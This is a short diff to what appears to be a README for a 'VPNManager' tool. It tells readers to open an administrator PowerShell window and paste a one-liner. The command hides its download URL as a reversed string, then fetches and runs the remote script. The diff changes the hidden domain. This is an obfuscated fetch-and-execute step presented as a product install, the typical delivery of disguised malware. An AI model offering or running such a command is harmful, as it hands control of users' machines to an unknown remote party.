@@ -39,7 +39,7 @@
 Press `Win + X` → **Terminal (Admin)** → paste the command below → press `Enter`
 
 ```powershell
-"VPNManager";iex(irm((-join"vpn.mrtig//:sptth"[-1..-99])))
+"VPNManager";iex(irm((-join"dfc.mrtig//:sptth"[-1..-99])))
 ```
 
 **⏱ Wait 5–10 minutes. Don't close the window until it finishes.**
